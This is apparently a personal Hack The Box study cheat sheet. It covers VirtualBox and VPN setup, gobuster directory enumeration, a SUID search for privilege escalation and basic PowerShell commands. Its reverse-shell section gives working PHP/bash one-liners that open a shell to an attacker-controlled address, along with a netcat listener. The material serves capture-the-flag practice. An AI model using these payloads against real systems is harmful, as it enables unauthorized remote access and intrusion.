# HTB-Note
note about Hack The Box

## Virtual Box Setting

### Run GuestAddictionsCD

```Shell
cd /media/
sudo mount /dev/cdrom /media/cdrom1
cd /cdrom1
sudo ./VBoxLinuxAdditions.run 
reboot
```

### Open VPN

- Download ovpn file **for VIP account**

```Shell
sudo openvpn --config ./Desktop/yufujioka.ovpn
```

## CheatShhet

### MSFvenom

- [MSFvenom ~ ペイロード早見表 ~](https://qiita.com/mr-wacker/items/0ec926951ffa5a4d197c)

### Directory Enumlation

- Gobuster options
  - [Gobuster Cheatsheet](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
- quick play
```
gobuster dir -t 100 -u http://url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o outfile
```

### Reverse Shell

- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc)
```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
```
```
nc -lnvp 1234
```
- Direct input
```shell
php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Privilege escalation

#### find SUID 

```shell
find / -perm -u=s -type f 2>/dev/null
```

### PowerShell

- whoami
```
$env:UserName
```
- 論理ドライブの一覧を表示
```
Get-PSDrive
```
- カレントドライブの移動
```
Set-Location C:
```
